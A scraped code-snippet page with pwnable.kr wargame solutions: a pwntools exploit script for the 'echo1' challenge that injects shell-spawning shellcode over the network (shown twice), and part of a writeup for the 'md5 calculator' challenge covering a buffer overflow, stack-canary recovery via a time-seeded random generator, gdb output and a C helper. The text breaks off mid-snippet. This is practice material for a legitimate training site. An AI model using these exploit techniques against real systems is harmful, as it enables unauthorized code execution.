Nouiri</code></div><div class="line number4 index3 alt1">&nbsp;</div><div class="line number5 index4 alt2">&nbsp;</div><div class="line number6 index5 alt1"><code class="python keyword">from</code> <code class="python plain">pwn </code><code class="python keyword">import</code> <code class="python keyword">*</code></div><div class="line number7 index6 alt2">&nbsp;</div><div class="line number8 index7 alt1"><code class="python plain">context.arch</code><code class="python keyword">=</code> <code class="python string">"amd64"</code></div><div class="line number9 index8 alt2"><code class="python plain">context.os </code><code class="python keyword">=</code> <code class="python string">"linux"</code></div><div class="line number10 index9 alt1">&nbsp;</div><div class="line number11 index10 alt2"><code class="python plain">cmd </code><code class="python keyword">=</code> <code class="python value">0x6020a0</code></div><div class="line number12 index11 alt1"><code class="python comments">"""</code></div><div class="line number13 index12 alt2"><code class="python comments">fgetsGOT = 0x602020</code></div><div class="line number14 index13 alt1"><code class="python comments">PUTS = 0x400630</code></div><div class="line number15 index14 alt2"><code class="python comments">"""</code></div><div class="line number16 index15 alt1"><code class="python plain">JMP </code><code class="python keyword">=</code> <code class="python plain">asm(</code><code class="python string">"jmp rsp"</code><code class="python plain">)</code></div><div class="line number17 index16 alt2"><code class="python plain">SC </code><code class="python keyword">=</code> <code class="python plain">asm(shellcraft.sh())</code></div><div class="line number18 index17 alt1">&nbsp;</div><div class="line number19 index18 alt2"><code class="python comments">#con = process("./echo1")</code></div><div class="line number20 index19 alt1"><code class="python plain">con </code><code class="python keyword">=</code> <code class="python plain">remote(</code><code class="python string">"pwnable.kr"</code><code class="python plain">,</code><code class="python value">9010</code><code class="python plain">)</code></div><div class="line number21 index20 alt2">&nbsp;</div><div class="line number22 index21 alt1"><code class="python plain">con.recvuntil(</code><code class="python string">"name? :"</code><code class="python plain">)</code></div><div class="line number23 index22 alt2"><code class="python plain">con.sendline(JMP)</code></div><div class="line number24 index23 alt1">&nbsp;</div><div class="line number25 index24 alt2"><code class="python plain">con.recvuntil(</code><code class="python string">"&gt;"</code><code class="python plain">)</code></div><div class="line number26 index25 alt1"><code class="python plain">con.sendline(</code><code class="python string">"1"</code><code class="python plain">)</code></div><div class="line number27 index26 alt2"><code class="python plain">con.recvuntil(</code><code class="python string">"\n"</code><code class="python plain">)</code></div><div class="line number28 index27 alt1">&nbsp;</div><div class="line number29 index28 alt2"><code class="python plain">payload </code><code class="python keyword">=</code> <code class="python string">"A"</code><code class="python keyword">*</code><code class="python value">40</code></div><div class="line number30 index29 alt1"><code class="python plain">payload </code><code class="python keyword">+</code><code class="python keyword">=</code> <code class="python plain">p64(cmd)</code></div><div class="line number31 index30 alt2"><code class="python plain">payload </code><code class="python keyword">+</code><code class="python keyword">=</code> <code class="python plain">SC</code></div><div class="line number32 index31 alt1">&nbsp;</div><div class="line number33 index32 alt2"><code class="python plain">con.sendline(payload)</code></div><div class="line number34 index33 alt1"><code class="python plain">con.interactive(</code><code class="python string">"Shell# "</code><code class="python plain">)</code></div></div></td></tr></tbody></table></div></div>
</div>
<br>
echo1 - Pwnable.kr
</div>




<div class="result">
<h2 class="title">
<a href="https://pythonexample.com/user/spnow">spnow</a>/<a href="https://pythonexample.com/snippet/python/echo1py_spnow_python">echo1.py</a>
<span class="language">(<a href="https://pythonexample.com/language/python/"> python</a>)</span>
</h2>
<div class="snippet">

<div><div id="highlighter_587515" class="syntaxhighlighter  python"><div class="toolbar"><span><a href="https://pythonexample.com/code/pwnable.kr-crypto1/#" class="toolbar_item command_help help">?</a></span></div><table border="0" cellpadding="0" cellspacing="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div><div class="line number20 index19 alt1">20</div><div class="line number21 index20 alt2">21</div><div class="line number22 index21 alt1">22</div><div class="line number23 index22 alt2">23</div><div class="line number24 index23 alt1">24</div><div class="line number25 index24 alt2">25</div><div class="line number26 index25 alt1">26</div><div class="line number27 index26 alt2">27</div><div class="line number28 index27 alt1">28</div><div class="line number29 index28 alt2">29</div><div class="line number30 index29 alt1">30</div><div class="line number31 index30 alt2">31</div><div class="line number32 index31 alt1">32</div><div class="line number33 index32 alt2">33</div><div class="line number34 index33 alt1">34</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="python comments">#!/usr/bin/python</code></div><div class="line number2 index1 alt1">&nbsp;</div><div class="line number3 index2 alt2"><code class="python comments">#author : Abdeljalil Nouiri</code></div><div class="line number4 index3 alt1">&nbsp;</div><div class="line number5 index4 alt2">&nbsp;</div><div class="line number6 index5 alt1"><code class="python keyword">from</code> <code class="python plain">pwn </code><code class="python keyword">import</code> <code class="python keyword">*</code></div><div class="line number7 index6 alt2">&nbsp;</div><div class="line number8 index7 alt1"><code class="python plain">context.arch</code><code class="python keyword">=</code> <code class="python string">"amd64"</code></div><div class="line number9 index8 alt2"><code class="python plain">context.os </code><code class="python keyword">=</code> <code class="python string">"linux"</code></div><div class="line number10 index9 alt1">&nbsp;</div><div class="line number11 index10 alt2"><code class="python plain">cmd </code><code class="python keyword">=</code> <code class="python value">0x6020a0</code></div><div class="line number12 index11 alt1"><code class="python comments">"""</code></div><div class="line number13 index12 alt2"><code class="python comments">fgetsGOT = 0x602020</code></div><div class="line number14 index13 alt1"><code class="python comments">PUTS = 0x400630</code></div><div class="line number15 index14 alt2"><code class="python comments">"""</code></div><div class="line number16 index15 alt1"><code class="python plain">JMP </code><code class="python keyword">=</code> <code class="python plain">asm(</code><code class="python string">"jmp rsp"</code><code class="python plain">)</code></div><div class="line number17 index16 alt2"><code class="python plain">SC </code><code class="python keyword">=</code> <code class="python plain">asm(shellcraft.sh())</code></div><div class="line number18 index17 alt1">&nbsp;</div><div class="line number19 index18 alt2"><code class="python comments">#con = process("./echo1")</code></div><div class="line number20 index19 alt1"><code class="python plain">con </code><code class="python keyword">=</code> <code class="python plain">remote(</code><code class="python string">"pwnable.kr"</code><code class="python plain">,</code><code class="python value">9010</code><code class="python plain">)</code></div><div class="line number21 index20 alt2">&nbsp;</div><div class="line number22 index21 alt1"><code class="python plain">con.recvuntil(</code><code class="python string">"name? :"</code><code class="python plain">)</code></div><div class="line number23 index22 alt2"><code class="python plain">con.sendline(JMP)</code></div><div class="line number24 index23 alt1">&nbsp;</div><div class="line number25 index24 alt2"><code class="python plain">con.recvuntil(</code><code class="python string">"&gt;"</code><code class="python plain">)</code></div><div class="line number26 index25 alt1"><code class="python plain">con.sendline(</code><code class="python string">"1"</code><code class="python plain">)</code></div><div class="line number27 index26 alt2"><code class="python plain">con.recvuntil(</code><code class="python string">"\n"</code><code class="python plain">)</code></div><div class="line number28 index27 alt1">&nbsp;</div><div class="line number29 index28 alt2"><code class="python plain">payload </code><code class="python keyword">=</code> <code class="python string">"A"</code><code class="python keyword">*</code><code class="python value">40</code></div><div class="line number30 index29 alt1"><code class="python plain">payload </code><code class="python keyword">+</code><code class="python keyword">=</code> <code class="python plain">p64(cmd)</code></div><div class="line number31 index30 alt2"><code class="python plain">payload </code><code class="python keyword">+</code><code class="python keyword">=</code> <code class="python plain">SC</code></div><div class="line number32 index31 alt1">&nbsp;</div><div class="line number33 index32 alt2"><code class="python plain">con.sendline(payload)</code></div><div class="line number34 index33 alt1"><code class="python plain">con.interactive(</code><code class="python string">"Shell# "</code><code class="python plain">)</code></div></div></td></tr></tbody></table></div></div>
</div>
<br>
echo1 - Pwnable.kr
</div>




<div class="result">
<h2 class="title">
<a href="https://pythonexample.com/user/ihciah">ihciah</a>/<a href="https://pythonexample.com/snippet/python/readmemd_ihciah_python">README.MD</a>
<span class="language">(<a href="https://pythonexample.com/language/python/"> python</a>)</span>
</h2>
<div class="snippet">

<div><div id="highlighter_560378" class="syntaxhighlighter  python"><div class="toolbar"><span><a href="https://pythonexample.com/code/pwnable.kr-crypto1/#" class="toolbar_item command_help help">?</a></span></div><table border="0" cellpadding="0" cellspacing="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div><div class="line number20 index19 alt1">20</div><div class="line number21 index20 alt2">21</div><div class="line number22 index21 alt1">22</div><div class="line number23 index22 alt2">23</div><div class="line number24 index23 alt1">24</div><div class="line number25 index24 alt2">25</div><div class="line number26 index25 alt1">26</div><div class="line number27 index26 alt2">27</div><div class="line number28 index27 alt1">28</div><div class="line number29 index28 alt2">29</div><div class="line number30 index29 alt1">30</div><div class="line number31 index30 alt2">31</div><div class="line number32 index31 alt1">32</div><div class="line number33 index32 alt2">33</div><div class="line number34 index33 alt1">34</div><div class="line number35 index34 alt2">35</div><div class="line number36 index35 alt1">36</div><div class="line number37 index36 alt2">37</div><div class="line number38 index37 alt1">38</div><div class="line number39 index38 alt2">39</div><div class="line number40 index39 alt1">40</div><div class="line number41 index40 alt2">41</div><div class="line number42 index41 alt1">42</div><div class="line number43 index42 alt2">43</div><div class="line number44 index43 alt1">44</div><div class="line number45 index44 alt2">45</div><div class="line number46 index45 alt1">46</div><div class="line number47 index46 alt2">47</div><div class="line number48 index47 alt1">48</div><div class="line number49 index48 alt2">49</div><div class="line number50 index49 alt1">50</div><div class="line number51 index50 alt2">51</div><div class="line number52 index51 alt1">52</div><div class="line number53 index52 alt2">53</div><div class="line number54 index53 alt1">54</div><div class="line number55 index54 alt2">55</div><div class="line number56 index55 alt1">56</div><div class="line number57 index56 alt2">57</div><div class="line number58 index57 alt1">58</div><div class="line number59 index58 alt2">59</div><div class="line number60 index59 alt1">60</div><div class="line number61 index60 alt2">61</div><div class="line number62 index61 alt1">62</div><div class="line number63 index62 alt2">63</div><div class="line number64 index63 alt1">64</div><div class="line number65 index64 alt2">65</div><div class="line number66 index65 alt1">66</div><div class="line number67 index66 alt2">67</div><div class="line number68 index67 alt1">68</div><div class="line number69 index68 alt2">69</div><div class="line number70 index69 alt1">70</div><div class="line number71 index70 alt2">71</div><div class="line number72 index71 alt1">72</div><div class="line number73 index72 alt2">73</div><div class="line number74 index73 alt1">74</div><div class="line number75 index74 alt2">75</div><div class="line number76 index75 alt1">76</div><div class="line number77 index76 alt2">77</div><div class="line number78 index77 alt1">78</div><div class="line number79 index78 alt2">79</div><div class="line number80 index79 alt1">80</div><div class="line number81 index80 alt2">81</div><div class="line number82 index81 alt1">82</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="python comments"># Pwnable.kr md5 calculator writeup</code></div><div class="line number2 index1 alt1"><code class="python plain">ihciah@gmail.com</code></div><div class="line number3 index2 alt2">&nbsp;</div><div class="line number4 index3 alt1"><code class="python plain">In `process_hash`, the size of </code><code class="python functions">input</code> <code class="python keyword">is</code> <code class="python plain">`</code><code class="python value">1024</code><code class="python plain">`, the size after `b64d` </code><code class="python keyword">is</code> <code class="python value">512</code><code class="python plain">, however, it should be `</code><code class="python value">1024</code><code class="python keyword">*</code><code class="python value">3</code><code class="python keyword">/</code><code class="python value">4</code><code class="python plain">`, so there's a </code><code class="python functions">buffer</code> <code class="python plain">overflow here.</code></div><div class="line number5 index4 alt2">&nbsp;</div><div class="line number6 index5 alt1"><code class="python plain">Because of the stack canary, we can do nothing. I was confused here until I noticed the canary </code><code class="python keyword">is</code> <code class="python plain">also used </code><code class="python keyword">in</code> <code class="python plain">`my_hash` to generate random number. Since the canary </code><code class="python keyword">is</code> <code class="python plain">`gs:</code><code class="python value">0x14</code><code class="python plain">`, it's always the same </code><code class="python keyword">in</code> <code class="python functions">all</code> <code class="python plain">function calls.</code></div><div class="line number7 index6 alt2">&nbsp;</div><div class="line number8 index7 alt1"><code class="python plain">We can calculate the canary value </code><code class="python keyword">from</code> <code class="python plain">the `captcha` because the seed of randomization </code><code class="python keyword">is</code> <code class="python plain">the current time, we can fetch it </code><code class="python keyword">from</code> <code class="python plain">http request to `http:</code><code class="python keyword">/</code><code class="python keyword">/</code><code class="python plain">pwnable.kr`.</code></div><div class="line number9 index8 alt2">&nbsp;</div><div class="line number10 index9 alt1"><code class="python plain">After trying </code><code class="python functions">input</code> <code class="python plain">`b64e(</code><code class="python string">"AAAA"</code><code class="python keyword">*</code><code class="python plain">(</code><code class="python value">768</code><code class="python keyword">/</code><code class="python value">4</code><code class="python plain">))` to the program, jump to </code><code class="python keyword">pass</code> <code class="python plain">the canary check </code><code class="python keyword">and</code> <code class="python keyword">break</code> <code class="python plain">at `ret`, we can notice that the top of stack </code><code class="python keyword">is</code> <code class="python plain">`AAAA...`.</code></div><div class="line number11 index10 alt2">&nbsp;</div><div class="line number12 index11 alt1"><code class="python plain">Again we </code><code class="python functions">input</code> <code class="python plain">`b64e(string.ascii_uppercase[:</code><code class="python value">24</code><code class="python plain">]</code><code class="python keyword">*</code><code class="python plain">(</code><code class="python value">768</code><code class="python keyword">/</code><code class="python value">24</code><code class="python plain">))`, we can see:</code></div><div class="line number13 index12 alt2">&nbsp;</div><div class="line number14 index13 alt1"><code class="python plain">```</code></div><div class="line number15 index14 alt2"><code class="python plain">[</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python plain">code</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python plain">]</code></div><div class="line number16 index15 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;</code><code class="python value">0x804908b</code> <code class="python plain">&lt;process_hash</code><code class="python keyword">+</code><code class="python value">249</code><code class="python plain">&gt;:&nbsp; pop&nbsp;&nbsp;&nbsp; ebx</code></div><div class="line number17 index16 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;</code><code class="python value">0x804908c</code> <code class="python plain">&lt;process_hash</code><code class="python keyword">+</code><code class="python value">250</code><code class="python plain">&gt;:&nbsp; pop&nbsp;&nbsp;&nbsp; edi</code></div><div class="line number18 index17 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;</code><code class="python value">0x804908d</code> <code class="python plain">&lt;process_hash</code><code class="python keyword">+</code><code class="python value">251</code><code class="python plain">&gt;:&nbsp; pop&nbsp;&nbsp;&nbsp; ebp</code></div><div class="line number19 index18 alt2"><code class="python keyword">=</code><code class="python plain">&gt; </code><code class="python value">0x804908e</code> <code class="python plain">&lt;process_hash</code><code class="python keyword">+</code><code class="python value">252</code><code class="python plain">&gt;:&nbsp;&nbsp; ret&nbsp;&nbsp;&nbsp; </code></div><div class="line number20 index19 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;</code><code class="python value">0x804908f</code> <code class="python plain">&lt;main&gt;:&nbsp; push&nbsp;&nbsp; ebp</code></div><div class="line number21 index20 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;</code><code class="python value">0x8049090</code> <code class="python plain">&lt;main</code><code class="python keyword">+</code><code class="python value">1</code><code class="python plain">&gt;:&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp; ebp,esp</code></div><div class="line number22 index21 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;</code><code class="python value">0x8049092</code> <code class="python plain">&lt;main</code><code class="python keyword">+</code><code class="python value">3</code><code class="python plain">&gt;:&nbsp;&nbsp;&nbsp; </code><code class="python keyword">and</code>&nbsp;&nbsp;&nbsp; <code class="python plain">esp,</code><code class="python value">0xfffffff0</code></div><div class="line number23 index22 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;</code><code class="python value">0x8049095</code> <code class="python plain">&lt;main</code><code class="python keyword">+</code><code class="python value">6</code><code class="python plain">&gt;:&nbsp;&nbsp;&nbsp; sub&nbsp;&nbsp;&nbsp; esp,</code><code class="python value">0x20</code></div><div class="line number24 index23 alt1"><code class="python plain">[</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python plain">stack</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code><code class="python plain">]</code></div><div class="line number25 index24 alt2"><code class="python value">0000</code><code class="python plain">| </code><code class="python value">0xffffdb8c</code> <code class="python plain">(</code><code class="python string">"ABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGH"</code><code class="python plain">...)</code></div><div class="line number26 index25 alt1"><code class="python value">0004</code><code class="python plain">| </code><code class="python value">0xffffdb90</code> <code class="python plain">(</code><code class="python string">"EFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKL"</code><code class="python plain">...)</code></div><div class="line number27 index26 alt2"><code class="python value">0008</code><code class="python plain">| </code><code class="python value">0xffffdb94</code> <code class="python plain">(</code><code class="python string">"IJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOP"</code><code class="python plain">...)</code></div><div class="line number28 index27 alt1"><code class="python value">0012</code><code class="python plain">| </code><code class="python value">0xffffdb98</code> <code class="python plain">(</code><code class="python string">"MNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRST"</code><code class="python plain">...)</code></div><div class="line number29 index28 alt2"><code class="python value">0016</code><code class="python plain">| </code><code class="python value">0xffffdb9c</code> <code class="python plain">(</code><code class="python string">"QRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWX"</code><code class="python plain">...)</code></div><div class="line number30 index29 alt1"><code class="python value">0020</code><code class="python plain">| </code><code class="python value">0xffffdba0</code> <code class="python plain">(</code><code class="python string">"UVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCD"</code><code class="python plain">...)</code></div><div class="line number31 index30 alt2"><code class="python value">0024</code><code class="python plain">| </code><code class="python value">0xffffdba4</code> <code class="python plain">(</code><code class="python string">"ABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGHIJKLMNOPQRSTUVWXABCDEFGH"</code><code class="python plain">...)</code></div><div class="line number32 index31 alt1"><code class="python plain">```</code></div><div class="line number33 index32 alt2"><code class="python plain">Just </code><code class="python keyword">return</code> <code class="python plain">to `</code><code class="python value">0x08049187</code><code class="python plain">` to do `system` with parameter </code><code class="python keyword">in</code> <code class="python plain">stack.</code></div><div class="line number34 index33 alt1">&nbsp;</div><div class="line number35 index34 alt2"><code class="python keyword">-</code><code class="python keyword">-</code><code class="python keyword">-</code></div><div class="line number36 index35 alt1">&nbsp;</div><div class="line number37 index36 alt2"><code class="python plain">Break at the stack check </code><code class="python keyword">and</code> <code class="python plain">run the program. The time now </code><code class="python keyword">is</code> <code class="python plain">`</code><code class="python value">1454513017</code><code class="python plain">`, </code><code class="python keyword">and</code> <code class="python plain">the captcha </code><code class="python keyword">is</code> <code class="python plain">`</code><code class="python keyword">-</code><code class="python value">2091140111</code><code class="python plain">`. Feed these two data into a small program which </code><code class="python keyword">is</code> <code class="python plain">used to calculate stack cookie. And we get output `</code><code class="python value">8a120200</code><code class="python plain">`, just as the same as what we </code><code class="python keyword">print</code> <code class="python keyword">in</code> <code class="python plain">gdb.</code></div><div class="line number38 index37 alt1">&nbsp;</div><div class="line number39 index38 alt2"><code class="python plain">```</code></div><div class="line number40 index39 alt1"><code class="python comments">#include &lt;assert.h&gt;</code></div><div class="line number41 index40 alt2"><code class="python comments">#include &lt;stdlib.h&gt;</code></div><div class="line number42 index41 alt1"><code class="python comments">#include &lt;stdio.h&gt;</code></div><div class="line number43 index42 alt2"><code class="python functions">int</code> <code class="python plain">main(</code><code class="python functions">int</code> <code class="python plain">argc, char </code><code class="python keyword">*</code><code class="python keyword">*</code><code class="python plain">argv){</code></div><div class="line number44 index43 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">assert</code><code class="python plain">(argc</code><code class="python keyword">=</code><code class="python keyword">=</code><code class="python value">3</code><code class="python plain">);</code></div><div class="line number45 index44 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python functions">int</code> <code class="python plain">t </code><code class="python keyword">=</code> <code class="python plain">atoi(argv[</code><code class="python value">1</code><code class="python plain">]);</code></div><div class="line number46 index45 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python functions">int</code> <code class="python plain">m </code><code class="python keyword">=</code> <code class="python plain">atoi(argv[</code><code class="python value">2</code><code class="python plain">]);</code></div><div class="line number47 index46 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">srand(t);</code></div><div class="line number48 index47 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python functions">int</code> <code class="python plain">i</code><code class="python keyword">=</code><code class="python value">0</code><code class="python plain">;</code></div><div class="line number49 index48 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python functions">int</code> <code class="python plain">rands[</code><code class="python value">8</code><code class="python plain">];</code></div><div class="line number50 index49 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">for</code><code class="python plain">(i</code><code class="python keyword">=</code><code class="python value">0</code><code class="python plain">;i&lt;</code><code class="python keyword">=</code><code class="python value">7</code><code class="python plain">;i</code><code class="python keyword">+</code><code class="python keyword">+</code><code class="python plain">){</code></div><div class="line number51 index50 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">rands[i]</code><code class="python keyword">=</code><code class="python plain">rand();</code></div><div class="line number52 index51 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">}</code></div><div class="line number53 index52 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python functions">int</code> <code class="python plain">a </code><code class="python keyword">=</code> <code class="python plain">rands[</code><code class="python value">1</code><code class="python plain">]</code><code class="python keyword">+</code><code class="python plain">rands[</code><code class="python value">2</code><code class="python plain">]</code><code class="python keyword">-</code><code class="python plain">rands[</code><code class="python value">3</code><code class="python plain">]</code><code class="python keyword">+</code><code class="python plain">rands[</code><code class="python value">4</code><code class="python plain">]</code><code class="python keyword">+</code><code class="python plain">rands[</code><code class="python value">5</code><code class="python plain">]</code><code class="python keyword">-</code><code class="python plain">rands[</code><code class="python value">6</code><code class="python plain">]</code><code class="python keyword">+</code><code class="python plain">rands[</code><code class="python value">7</code><code class="python plain">];</code></div><div class="line number54 index53 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">m </code><code class="python keyword">-</code><code class="python keyword">=</code> <code class="python plain">a;</code></div><div class="line number55 index54 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">printf(</code><code class="python string">"%x\n"</code><code class="python plain">,m);</code></div><div class="line number56 index55 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">return</code> <code class="python value">0</code><code class="python plain">;</code></div><div class="line number57 index56 alt2"><code class="python plain">}</code></div><div class="line number58 index57 